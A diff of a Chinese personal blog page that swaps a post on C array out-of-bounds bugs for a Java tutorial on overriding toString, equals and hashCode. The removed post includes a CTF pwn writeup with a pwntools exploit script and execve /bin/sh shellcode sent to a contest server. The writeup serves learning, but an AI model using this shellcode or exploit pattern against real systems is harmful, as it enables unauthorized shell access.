@@ -3,44 +3,29 @@
 <head>
   <meta charset="utf-8">
   
-  <title>pwn之-数组下标越界 | YungGong</title>
+  <title>java之Tostring、equals和HashCode方法的重写 | YungGong</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="#数组的下标越界
-下标越界
-在引用数组元素时，使用的下标超过了该数组下标的应有范围，但应注意的是:
-C/C++不对数组做边界检查。 可以重写数组的每一端，并写入一些其他变量的
-数组或者甚至是写入程序的代码。不检查下标是否越界可以有效提高程序运行
-的效率，因为如果你检查，那么编译器必须在生成的目标代码中加入额外的代
-码用于程序运行时检测下标是否越界，这就会导致程序的运行速度下降，所以
-为了程序的运行">
+  <meta name="description" content="#java之Tostring、equals和HashCode方法的重写
+##0x00为什么要重写toString()方法和hashcode()方法一、toString():
+在Object类里面定义toString（）方法的时候返回的对象的哈希code码，这个hashcode码不能简单明了的表示出对象的属性。所以要重写toString（）方法。当需要将一个对象输出到显示器时,通常要调用他的toSt">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwn之-数组下标越界">
-<meta property="og:url" content="http://yunnigu.dropsec.xyz/2016/08/09/pwn之-数组下标越界/index.html">
+<meta property="og:title" content="java之Tostring、equals和HashCode方法的重写">
+<meta property="og:url" content="http://yunnigu.dropsec.xyz/2016/10/20/java之Tostring和HashCode方法的重写/index.html">
 <meta property="og:site_name" content="YungGong">
-<meta property="og:description" content="#数组的下标越界
-下标越界
-在引用数组元素时，使用的下标超过了该数组下标的应有范围，但应注意的是:
-C/C++不对数组做边界检查。 可以重写数组的每一端，并写入一些其他变量的
-数组或者甚至是写入程序的代码。不检查下标是否越界可以有效提高程序运行
-的效率，因为如果你检查，那么编译器必须在生成的目标代码中加入额外的代
-码用于程序运行时检测下标是否越界，这就会导致程序的运行速度下降，所以
-为了程序的运行">
-<meta property="og:image" content="http://sh3ll.me/images/2016/07/04/ichunqiu-1.png">
-<meta property="og:image" content="http://sh3ll.me/images/2016/07/04/ichunqiu-2.png">
-<meta property="og:image" content="http://a1.qpic.cn/psb?/V14JgGr112jeEy/ZsK6c1kSjVyLYonikHdZi3XkgJhvb3L2bgrr7QIXazg!/b/dAUBAAAAAAAA&bo=BQFxAAAAAAADB1c!&rf=viewer_4">
-<meta property="og:image" content="http://a3.qpic.cn/psb?/V14JgGr112jeEy/Ud2B5WDbmnldBKpmCqkHPVuCrBJFu2Z7ViccuTGYEUA!/b/dPgAAAAAAAAA&bo=vQKAAgAAAAADBx8!&rf=viewer_4">
-<meta property="og:updated_time" content="2016-08-19T11:49:15.113Z">
+<meta property="og:description" content="#java之Tostring、equals和HashCode方法的重写
+##0x00为什么要重写toString()方法和hashcode()方法一、toString():
+在Object类里面定义toString（）方法的时候返回的对象的哈希code码，这个hashcode码不能简单明了的表示出对象的属性。所以要重写toString（）方法。当需要将一个对象输出到显示器时,通常要调用他的toSt">
+<meta property="og:image" content="http://p1.bqimg.com/567571/ac768509e2549f61.png">
+<meta property="og:image" content="http://p1.bqimg.com/567571/ba24032a2cc032a5.png">
+<meta property="og:image" content="http://p1.bpimg.com/567571/c69b98e11c2eabd6.png">
+<meta property="og:image" content="http://p1.bpimg.com/567571/a57a8582146b4f05.png">
+<meta property="og:updated_time" content="2016-10-20T08:19:32.451Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="pwn之-数组下标越界">
-<meta name="twitter:description" content="#数组的下标越界
-下标越界
-在引用数组元素时，使用的下标超过了该数组下标的应有范围，但应注意的是:
-C/C++不对数组做边界检查。 可以重写数组的每一端，并写入一些其他变量的
-数组或者甚至是写入程序的代码。不检查下标是否越界可以有效提高程序运行
-的效率，因为如果你检查，那么编译器必须在生成的目标代码中加入额外的代
-码用于程序运行时检测下标是否越界，这就会导致程序的运行速度下降，所以
-为了程序的运行">
-<meta name="twitter:image" content="http://sh3ll.me/images/2016/07/04/ichunqiu-1.png">
+<meta name="twitter:title" content="java之Tostring、equals和HashCode方法的重写">
+<meta name="twitter:description" content="#java之Tostring、equals和HashCode方法的重写
+##0x00为什么要重写toString()方法和hashcode()方法一、toString():
+在Object类里面定义toString（）方法的时候返回的对象的哈希code码，这个hashcode码不能简单明了的表示出对象的属性。所以要重写toString（）方法。当需要将一个对象输出到显示器时,通常要调用他的toSt">
+<meta name="twitter:image" content="http://p1.bqimg.com/567571/ac768509e2549f61.png">
   
     <link rel="alternative" href="/atom.xml" title="YungGong" type="application/atom+xml">
   
@@ -251,11 +236,11 @@ C/C++不对数组做边界检查。 可以重写数组的每一端，并写入�
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-pwn之-数组下标越界" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-java之Tostring和HashCode方法的重写" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2016/08/09/pwn之-数组下标越界/" class="article-date">
-      <time datetime="2016-08-09T07:05:05.000Z" itemprop="datePublished">2016-08-09</time>
+      <a href="/2016/10/20/java之Tostring和HashCode方法的重写/" class="article-date">
+      <time datetime="2016-10-20T05:21:19.000Z" itemprop="datePublished">2016-10-20</time>
 </a>
     </div>
   
@@ -268,7 +253,7 @@ C/C++不对数组做边界检查。 可以重写数组的每一端，并写入�
         
   
     <h1 class="article-title" itemprop="name">
-      pwn之-数组下标越界
+      java之Tostring、equals和HashCode方法的重写
     </h1>
   
 
@@ -279,7 +264,7 @@ C/C++不对数组做边界检查。 可以重写数组的每一端，并写入�
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/">writeup</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞/">漏洞</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/java/">java</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -289,96 +274,102 @@ C/C++不对数组做边界检查。 可以重写数组的每一端，并写入�
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>#数组的下标越界</p>
-<p><strong>下标越界</strong></p>
-<p>在引用数组元素时，使用的下标超过了该数组下标的应有范围，但应注意的是:</p>
-<pre><code>C/C++不对数组做边界检查。 可以重写数组的每一端，并写入一些其他变量的
-数组或者甚至是写入程序的代码。不检查下标是否越界可以有效提高程序运行
-的效率，因为如果你检查，那么编译器必须在生成的目标代码中加入额外的代
-码用于程序运行时检测下标是否越界，这就会导致程序的运行速度下降，所以
-为了程序的运行效率，C / C++才不检查下标是否越界。发现如果数组下标越
-界了，那么它会自动接着那块内存往后写。 
-</code></pre><a id="more"></a>
-<p>关于C/C++为什么不对数组的下标是否越界做检查，可以参考：<br>This is an <a href="http://www.xuebuyuan.com/967089.html" target="_blank" rel="external">http://www.xuebuyuan.com/967089.html</a></p>
-<p>因为编译器不会自动检测你的数组下标是否越界，而是把这个任务交给了程序员自己，所以我们在写程序，引用数组元素时，一定注意不要让数组的下标越界。</p>
-<p>还有，初学者一定不能忘了数组的下标是从0开始的，不是常识中的从1开始。</p>
-<p>例一</p>
-<pre><code>1    void test1()
-2    {
-3        char string[10];
-4        char* str1 = &quot;0123456789&quot;;
-5        strcpy(string, str1);
-6    }
-</code></pre><p>例二</p>
-<pre><code>1    void test2()
-2    {
-3        char string[10], str1[10];
-4        int i;
-5        for(i=0; i&lt;10; i++)
-6        {
-7            str1[i] = &apos;a&apos;;
-8        }
-9        strcpy(string, str1);
-10   }
-</code></pre><p>例三</p>
-<pre><code>1    void test3(char* str1)
-2    {
-3        char string[10];
-4        if(strlen(str1) &lt;= 10)
-5        {
-6            strcpy(string, str1); 
-7        }
-8    }
-</code></pre><p>这3个例子都有数组越界的问题。</p>
-<p>例一中，string是一个含有10个元素的字符数组，str1指向的字符串长度为10，在进行strcpy调用时，会将str1的结束符也复制到string数组里，即复制的字符个数为11，这样会导致string出现数组越界。程序不一定会因此而崩溃，但这是一个潜在的危险。解决办法是将string的元素个数定义为11。</p>
-<p>例二中，str1和string都是含有10个元素的字符数组，并且str1的元素全部被赋为字符”a”，然后再调用strcpy。这里会出现以下两个问题：一个问题是str1表示的字符数组没有以’\0’结束，在随后调用strcpy时无法判断什么时候复制结束；另一个问题是string的数组长度不够，出现数组越界的现象。解决办法是将string和str1的元素个数都定义为11个，并在调用strcpy之前加入一条语句把str1[10]赋为’\0’。</p>
-<p>例三中，if语句使用小于等于”&lt;=”进行比较，如果str1的长度等于10，也会出现数组越界的情况。解决办法是把”&lt;=”换成”&lt;”。</p>
-<p>改正后的程序如下所示。</p>
-<p>例一</p>
-<pre><code>1    void test1()
-2    {
-3        char string[11];           //字符数组长度为11，多分配一个
-4        char* str1 = &quot;0123456789&quot;;
-5        strcpy(string, str1);
-6    }
-</code></pre><p>例二</p>
-<pre><code>1    void test2()
-2    {
-3        char string[11], str1[11];   //字符数组长度都为11，均多分配一个
-4        int i;
-5        for(i=0; i&lt;10; i++)
-6        {
-7            str1[i] = &apos;a&apos;;
-8        }
-9        str1[10] = &apos;\0&apos;;            //初始化str1为空字符串
-10       strcpy(string, str1);
-11   }
-</code></pre><p>例三</p>
-<pre><code>1    void test3(char*str1)
-2    {
-3        char string[10];
-4        if(strlen(str1) &lt; 10)        //不能用&lt;=
-5        {
-6            strcpy(string, str1); 
-7        }
-8    }
-</code></pre><p>##i春秋30强挑战赛pwn1 writeup</p>
-<p>在输入操作下标时没有检测是否越界，通过数组越界读获取获取伪造的函数指针执行 shellcode。</p>
-<p><img src="http://sh3ll.me/images/2016/07/04/ichunqiu-1.png" alt=""><br><img src="http://sh3ll.me/images/2016/07/04/ichunqiu-2.png" alt=""></p>
-<p>通过GDB调试，发现发送29控制eip，nx：disabled，布置好shellcode后直接getshell。</p>
-<p><img src="http://a1.qpic.cn/psb?/V14JgGr112jeEy/ZsK6c1kSjVyLYonikHdZi3XkgJhvb3L2bgrr7QIXazg!/b/dAUBAAAAAAAA&amp;bo=BQFxAAAAAAADB1c!&amp;rf=viewer_4" alt=""></p>
-<p><img src="http://a3.qpic.cn/psb?/V14JgGr112jeEy/Ud2B5WDbmnldBKpmCqkHPVuCrBJFu2Z7ViccuTGYEUA!/b/dPgAAAAAAAAA&amp;bo=vQKAAgAAAAADBx8!&amp;rf=viewer_4" alt=""></p>
-<p><strong>利用代码</strong></p>
-<pre><code>from pwn import *
-# io = process(&quot;./tc1&quot;)
-io = remote(&quot;106.75.9.11&quot;, 20000)
-io.recvuntil(&quot;4. Divide&quot;)
-io.sendline(&quot;29&quot;)
-io.recvuntil(&quot;[123 110]&quot;)
-payload = p32(0x804a0a4) + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot;
-io.sendline(payload)
-io.interactive()
-</code></pre>
+        <p>#java之Tostring、equals和HashCode方法的重写</p>
+<p>##0x00为什么要重写toString()方法和hashcode()方法<br>一、toString():</p>
+<p>在Object类里面定义toString（）方法的时候返回的对象的哈希code码，这个hashcode码不能简单明了的表示出对象的属性。所以要重写toString（）方法。<br>当需要将一个对象输出到显示器时,通常要调用他的toString()方法,将对象的内容转换为字符串.java中的所有类默认都有一个toString()方法。</p>
+<pre><code> public String toString() {
+    return getClass().getName() + &quot;@&quot; + Integer.toHexString(hashCode());
+}
+</code></pre><p>默认情况下 System.out.println(对象名)或者System.out.println(对象名.toString())输出的是此对象的类名和此对象对应内存的首地址如果想自定义输出信息必须重写toString()方法。</p>
+<p>注意事项：</p>
+<pre><code>1.必须被声明为public
+2.返回类型为String
+3.方法的名称必须为toString,且无参数
+4.方法体中不要使用输出方法System.out.println()
+</code></pre><p>二、equals()和hashCode():</p>
+<p>在Object类里面定义的equals比较的是对象的引用是否指向同一块内存地址。  一般情况下比较两个对象时比较他的值是否一致，所以要进行重写。重写之后是为了比较两个对象的value值是否相等。 特别指出，利用equals比较八大包装对象（如int，float等）和String类（因为该类已重写了equals和hashcode方法）对象时，默认比较的是值，在比较其它对象都是比较的引用地址。生成两个对象同时，会生成对应的散列码，当需要比较两个对象时，java先比较他们的hashCode，若不同，则两个对象就不同，若相同，再比较equals（）方法，判断是否相同。因此在重写equals的时候一定要重写hashCode</p>
+<p>注意事项：<br>1.自反性：对于任意的引用值x，x.equals(x)一定为true<br>2.对称性：对于任意的引用值x 和 y，当x.equals(y)返回true，y.equals(x)也一定返回true<br>3.传递性：对于任意的引用值x、y和ｚ，如果x.equals(y)返回true，并且y.equals(z)也返回true，那么x.equals(z)也一定返   回 true<br>4.一致性：对于任意的引用值x 和 y，如果用于equals比较的对象信息没有被修改，多次调用x.equals(y)要么一致地返回true，要么一致地返回false<br>5.非空性：对于任意的非空引用值x，x.equals(null)一定返回false</p>
+<p>##Tostring、equals和HashCode方法的重写<br>一、toString()方法的重写<br>首先，我们先来创建一个Persion类，它只简单的包含 firstname 和 lastname，当然，加上它的setter 和 getter 法。放在com.Collection1包下：</p>
+<p><img src="http://p1.bqimg.com/567571/ac768509e2549f61.png" alt=""></p>
+<p> 接下来，新建一个类，名为Test，让它包含main函数：</p>
+<p><img src="http://p1.bqimg.com/567571/ba24032a2cc032a5.png" alt=""></p>
+<pre><code>运行结果是com.Collection1.Persion@140e19d
+</code></pre><p> 但是我们想要的结果并不是这样，因为object类的toString()方法总是返回对象的实现类类名 + @ + hashCode值。这显然不能满足我们的需求。像这里，我们是希望能打印出p的全名出来，这时，就需要重写toString()方法，因为重写了toString()之后，那么p在调用toString()方法的时候，会优先调用自己类里的toString()方法。</p>
+<p>修改后的类如下：</p>
+<p><img src="http://p1.bpimg.com/567571/c69b98e11c2eabd6.png" alt=""></p>
+<p>运行结果变为我们想要的</p>
+<pre><code>Fire-Water@21029277
+</code></pre><p>二、equals()和hashCode()的重写</p>
+<p>先写一个student类，比较输入的属性age是否相等，如果相等则返回ture，由此objec默认的equals()方法就不再适用于此s，因此需要重写equals()和hashCode()方法。</p>
+<pre><code>public class student {
+    private String name;
+    private String id;
+    private int age=25;
+
+    public student() {
+    }
+
+    public String getName() {
+        return name;
+    }
+
+    public void setName(String name) {
+        this.name = name;
+    }
+
+    public String getId() {
+        return id;
+    }
+
+    public void setId(String id) {
+        this.id = id;
+    }
+
+    public int getAge() {
+        return age;
+    }
+
+    public void setAge(int age) {
+        this.age = age;
+    }
+
+    @Override
+    public boolean equals(Object o) {
+        if (this == o) return true;
+        if (o == null || getClass() != o.getClass()) return false;
+
+        student student = (student) o;
+
+        return age == student.age;
+
+    }
+
+    @Override
+    public int hashCode() {
+        return age;
+    }
+}
+</code></pre><p>在上一个Test类中添加验证</p>
+<pre><code>import com.Collection1.Persion;
+import com.equalsoverride.student;
+
+public class Test {
+    public static void main(String[] args) {
+
+        Persion p = new Persion();
+        student s = new student();
+        p.setFirstname(&quot;Fire&quot;);
+        p.setLastname(&quot;Water&quot;);
+        System.out.println(s.hashCode());
+        System.out.println(s.equals(s));
+        System.out.println(s.equals(24));
+        System.out.println(p.toString());
+    }
+
+}
+</code></pre><p>输出结果：</p>
+<p><img src="http://p1.bpimg.com/567571/a57a8582146b4f05.png" alt=""></p>
+
       
     </div>
     
@@ -386,13 +377,13 @@ io.interactive()
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2016/08/09/pwn之-数组下标越界/">pwn之-数组下标越界</a></p>
+        <p><span>本文标题:</span><a href="/2016/10/20/java之Tostring和HashCode方法的重写/">java之Tostring、equals和HashCode方法的重写</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 Yun 的个人博客">Yun</a></p>
-        <p><span>发布时间:</span>2016年08月09日 - 15时05分</p>
-        <p><span>最后更新:</span>2016年08月19日 - 19时49分</p>
+        <p><span>发布时间:</span>2016年10月20日 - 13时21分</p>
+        <p><span>最后更新:</span>2016年10月20日 - 16时19分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2016/08/09/pwn之-数组下标越界/" title="pwn之-数组下标越界">http://yunnigu.dropsec.xyz/2016/08/09/pwn之-数组下标越界/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yunnigu.dropsec.xyz/2016/08/09/pwn之-数组下标越界/　　作者: Yun" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2016/10/20/java之Tostring和HashCode方法的重写/" title="java之Tostring、equals和HashCode方法的重写">http://yunnigu.dropsec.xyz/2016/10/20/java之Tostring和HashCode方法的重写/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yunnigu.dropsec.xyz/2016/10/20/java之Tostring和HashCode方法的重写/　　作者: Yun" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script src="/js/clipboard.min.js"></script>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
@@ -405,18 +396,9 @@ io.interactive()
 
 <nav id="article-nav">
   
-    <a href="/2016/08/19/RSAtools使用方法/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption"><</strong>
-      <div class="article-nav-title">
-        
-          RSAtool使用方法
-        
-      </div>
-    </a>
   
-  
-    <a href="/2016/08/07/程序的动态链接和静态链接1/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">程序的动态链接和静态链接</div>
+    <a href="/2016/10/18/安装pycrypto遇到的一系列问题总结/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">安装pycrypto遇到的一系列问题总结</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -475,7 +457,7 @@ io.interactive()
     
       <div class="duoshuo" id="comments">
     <!-- 多说评论框 start -->
-    <div class="ds-thread" data-thread-key="2016/08/09/pwn之-数组下标越界/" data-title="pwn之-数组下标越界" data-url="http://yunnigu.dropsec.xyz/2016/08/09/pwn之-数组下标越界/"></div>
+    <div class="ds-thread" data-thread-key="2016/10/20/java之Tostring和HashCode方法的重写/" data-title="java之Tostring、equals和HashCode方法的重写" data-url="http://yunnigu.dropsec.xyz/2016/10/20/java之Tostring和HashCode方法的重写/"></div>
     <!-- 多说评论框 end -->
     <!-- 多说公共JS代码 start (一个网页只需插入一次) -->
     <script type="text/javascript">
@@ -498,13 +480,11 @@ io.interactive()
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2016/08/19/RSAtools使用方法/" title="上一篇: RSAtool使用方法">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a href="/2016/08/07/程序的动态链接和静态链接1/" title="下一篇: 程序的动态链接和静态链接">
+            <a href="/2016/10/18/安装pycrypto遇到的一系列问题总结/" title="下一篇: 安装pycrypto遇到的一系列问题总结">
                 <i class="fa fa-angle-right"></i>
             </a>
         
